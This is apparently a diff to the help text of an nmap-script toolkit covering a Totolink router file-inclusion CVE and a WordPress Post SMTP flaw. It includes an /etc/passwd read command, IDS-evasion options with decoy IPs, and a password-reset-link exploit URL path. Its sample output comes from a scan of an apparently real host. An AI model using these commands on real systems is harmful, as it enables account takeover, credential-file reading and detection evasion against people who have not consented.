@@ -145,21 +145,20 @@ $TotoLinkBanner = @"
 
 CVE-2026-7633-enum:
 A vulnerability was identified in Totolink N300RH 6.1c.1353_B20190305, this impacts the function
-setUploadSetting of the file /cgi-bin/cstecgi.cgi, such manipulation of the @argument FileName
+setUploadSetting of the file /cgi-bin/cstecgi.cgi such manipulation of the server argument FileName
 leads to file inclusion, remote code execution, buffer overflow or modification of configurations
 
 how detection works
 CVE-2026-7633-enum.nse searchs for /cgi-bin/cstecgi.cgi [uri] on target host has first vulnerability
 test, has second test it searchs for string.match(response.body,"Totolink N300RH 6.1c.13(53|90)") to
-confirm vulnerable versions, has final test sends one http.post() request to test for @args.filename
-access [read access] confirming that the vulnerability is 100% present and public exploitable
+confirm vulnerable version, has final test sends one http.post() request to test for @args.filename
+access privileges [read access] confirming that the vulnerability is 100% present and exploitable
+Note: this script random sellects an user-agent to send in the http.post (IDS signature evasion)
 
-test if we have read access to /etc/passwd
-nmap -sS -T2 <target> -p 80 --open --script CVE-2026-7633-enum --script-args filename="/etc/passwd"
-IDS evasion: --script-args filename="/etc/passwd" -D 4.207.247.138,52.123.131.14 --data-length "28"
 
 Output
-|Totolink N300RH V6.1c
+| CVE-2026-7633-enum:
+|  Title: Totolink setUploadSetting vuln
 |  STATE: VULNERABLE
 |    ID: CVE:CVE-2026-7633
 |    Risk factor: 6.4 (MEDIUM) (AV:N/AC:L/Au:N/C:N/I:P/A:P)
@@ -318,25 +317,33 @@ PORT      STATE    SERVICE
 
 $install11833 = @"
 
-CVE-2025-11833:
-The Post SMTP - Complete SMTP Solution with Logs, Alerts, Backup SMTP & Mobile App plugin
+Author: r00t-3xp10it - V1.5
+The Post SMTP – Complete SMTP Solution with Logs, Alerts, Backup SMTP & Mobile App plugin
 for WordPress is vulnerable to unauthorized access of data due to a missing capability check
 on the __construct function in all versions up to and including, 3.6.0 This makes it possible
 for unauthenticated attackers to read arbitrary logged emails sent through the Post SMTP plugin,
 including password reset emails containing password reset links which can lead to account takeover
 
-Remark: --script-args exploit="true" argument sends a http.post() request with a link to reset
+Remark: --script-args exploit="true" argument sends an http.post() request with a link to reset
 the wordpress admin password, then checks if target host responds with the recuperation link to
 confirm that system its 100% vulnerable to CVE-2025-11833 wordpress reset link vulnerability.
-
-Some web developers have moved /wp-login.php landing webpage further ahead in the website directory
-structure like: 'http://host:port/website/plugins/wp-login.php' in that case invoke CVE-2025-1183.nse:
---script-args uri="/website/plugins/wp-login.php" (required if invoked: --script-args exploit="true")
+Note: this script random sellects an user-agent to send in the http.post(IDS signature evasion)
 
 Output
-PORT   STATE SERVICE   VERSION
-25/tcp open  post smtp 3.6.0
-CVE-2025-11833-enum:
+NSE: testing login: [404] http://183.181.84.11:80/auth.php
+NSE: testing login: [404] http://183.181.84.11:80/login.php
+NSE: testing login: [404] http://183.181.84.11:80/admin.php
+NSE: testing login: [404] http://183.181.84.11:80/wp-admin.php
+NSE: testing login: [404] http://183.181.84.11:80/login-page.php
+NSE: testing login: [404] http://183.181.84.11:80/secure-login.php
+NSE: testing login: [200] http://183.181.84.11:80/wp-login.php [ found ]
+NSE: attack vector: /wp-login.php?action=lostpassword&page=postman_email_log&view=log&log_id=1&print=1
+Nmap scan report for sv8490.xserver.jp (183.181.84.11)
+Host is up (0.28s latency)
+
+PORT   STATE SERVICE
+25/tcp open  smtp
+CVE-2025-11833:
 |  Title: Post SMTP passwd reset link vulnerability
 |  State: VULNERABLE
 |   ID: CVE:CVE-2025-11833
@@ -348,7 +355,7 @@ CVE-2025-11833-enum:
 |  Exploit results:
 |   smtp detection: post smtp 3.6.0 [vulnerable version]
 |   _post request: /wp-login.php?action=lostpassword&page=postman_email_log&view=log&log_id=1&print=1
-|   _response: password reset link found in response [vulnerable]
+|   _response: PASSWORD RESET LINK FOUND IN RESPONSE [vulnerable]
 |     module author: r00t-3xp10it
 |
 | Referencies:
